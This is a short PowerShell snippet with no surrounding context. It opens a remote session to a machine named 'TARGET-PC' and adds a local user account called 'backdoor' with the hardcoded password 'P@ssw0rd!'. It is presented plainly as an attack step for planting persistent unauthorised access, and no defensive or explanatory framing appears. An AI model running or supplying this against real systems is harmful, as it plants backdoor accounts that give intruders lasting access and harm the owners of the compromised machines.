$Session = New-PSSession -ComputerName "TARGET-PC" -Credential (Get-Credential)
Invoke-Command -Session $Session -ScriptBlock { net user /add backdoor P@ssw0rd! }
